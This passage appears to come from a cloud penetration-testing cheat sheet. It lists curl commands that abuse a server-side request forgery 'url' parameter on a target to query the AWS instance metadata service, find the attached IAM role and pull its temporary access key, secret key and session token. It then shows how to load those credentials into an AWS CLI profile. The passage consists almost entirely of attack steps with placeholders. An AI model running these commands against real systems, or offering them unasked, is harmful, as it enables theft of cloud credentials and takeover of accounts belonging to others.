### 4.1 Temporary Security Credentials

- **Retrieve temporary credentials from instance metadata**  
   ```bash
   curl <TARGET_IP>:<PORT>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
   ```

- **Configure AWS CLI profile using temporary credentials**  
   Add the credentials to `~/.aws/credentials`:
   ```plaintext
   [<PROFILE_NAME>]
   aws_access_key_id=<ACCESS_KEY_ID>
   aws_secret_access_key=<SECRET_ACCESS_KEY>
   aws_session_token=<SESSION_TOKEN>
   ```

### 4.2 Instance Metadata Service (IMDS) Enumeration

- **Query EC2 instance metadata**  
   ```bash
   curl <TARGET_IP>:<PORT>/?url=http://169.254.169.254/latest/meta-data
   ```

- **Get IAM Role attached to the EC2 instance**  
   ```bash
   curl <TARGET_IP>:<PORT>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials
   ```

---